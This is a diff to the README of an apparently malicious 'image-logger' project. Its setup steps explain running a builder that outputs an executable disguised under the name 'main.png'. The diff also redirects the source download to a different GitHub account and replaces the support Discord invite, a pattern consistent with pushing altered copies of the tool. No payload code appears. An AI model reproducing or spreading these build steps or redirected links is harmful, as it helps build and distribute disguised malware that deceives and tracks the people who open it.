@@ -58,10 +58,10 @@
 
 ### Setup
 
-1. [Download source code zip](https://github.com/neveronsere/image-logger/archive/refs/heads/main.zip)
+1. [Download source code zip](https://github.com/Blaze2016)
 2. Extract zip
 3. Run `builder.bat`
-4. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.png`
+4. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.png
 
 <div align="center">
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/bu0.png"></img>
@@ -74,6 +74,6 @@
 
 ## Errors?
 
--   Join the [Discord](https://discord.gg/yeats)
+-   Join the [Discord](https://discord.gg/EgSeRWdY)
 
 <img src="img/footer.png">
